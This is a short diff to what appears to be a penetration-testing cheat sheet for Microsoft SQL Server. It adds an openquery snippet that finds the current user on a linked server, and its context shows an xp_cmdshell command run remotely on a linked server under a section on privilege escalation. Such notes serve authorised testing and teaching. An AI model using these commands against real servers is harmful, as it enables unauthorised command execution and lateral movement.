@@ -90,6 +90,11 @@ EXEC sp_addlinkedserver @server='LinkedServer', @srvproduct='', @provider='SQLNC
 EXEC ('EXEC xp_cmdshell ''dir C:\'';') AT LinkedServerName;
 ```
 
+#### Find user role on Linked Server
+```sql
+select myuser from openquery("LinkedServer", 'select system_user as myuser');
+```
+
 ---
 
 ### **4. Privilege Escalation via Stored Procedures**
